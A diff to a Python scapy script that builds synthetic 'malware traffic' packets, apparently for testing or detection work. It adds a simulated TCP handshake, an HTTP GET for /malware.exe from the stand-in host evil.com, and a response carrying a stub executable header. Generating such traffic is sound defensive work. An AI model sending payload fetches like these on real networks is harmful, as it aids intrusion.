@@ -231,22 +231,33 @@ def generate_malware_traffic():
         )
         packets.append(exfil)
     
-    # Suspicious file download
-    print("Generating malicious file download...")
-    download_req = (
-        IP(src=infected_host, dst=c2_server)/
-        TCP(sport=random.randint(30000, 40000), dport=80, flags="PA")/
-        Raw(load="GET /payload.exe HTTP/1.1\r\nHost: malware.download\r\n\r\n")
-    )
-    packets.append(download_req)
+    # File transfer - simulate downloading a file
+    print("Generating file transfer traffic...")
+    file_content = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"\x00" * 1000  # PE header
     
-    # Executable file response (simplified)
-    exe_response = (
-        IP(src=c2_server, dst=infected_host)/
-        TCP(sport=80, dport=download_req[TCP].sport, flags="PA")/
-        Raw(load="HTTP/1.1 200 OK\r\nContent-Type: application/x-msdownload\r\n\r\nMZ\x90\x00\x03" + "\x00"*1000)
+    sport = random.randint(50000, 60000)
+    
+    # TCP handshake
+    syn = IP(src=infected_host, dst=c2_server)/TCP(sport=sport, dport=80, flags="S", seq=1000)
+    syn_ack = IP(src=c2_server, dst=infected_host)/TCP(sport=80, dport=sport, flags="SA", seq=2000, ack=1001)
+    ack = IP(src=infected_host, dst=c2_server)/TCP(sport=sport, dport=80, flags="A", seq=1001, ack=2001)
+    packets.extend([syn, syn_ack, ack])
+    
+    # HTTP GET request
+    http_get = (
+        IP(src=infected_host, dst=c2_server)/
+        TCP(sport=sport, dport=80, flags="PA", seq=1001, ack=2001)/
+        Raw(load="GET /malware.exe HTTP/1.1\r\nHost: evil.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
     )
-    packets.append(exe_response)
+    packets.append(http_get)
+    
+    # HTTP response with file
+    http_response = (
+        IP(src=c2_server, dst=infected_host)/
+        TCP(sport=80, dport=sport, flags="PA", seq=2001, ack=1001+len(http_get[Raw].load))/
+        Raw(load=f"HTTP/1.1 200 OK\r\nContent-Type: application/x-msdownload\r\nContent-Length: {len(file_content)}\r\n\r\n".encode() + file_content)
+    )
+    packets.append(http_response)
     
     return packets
 
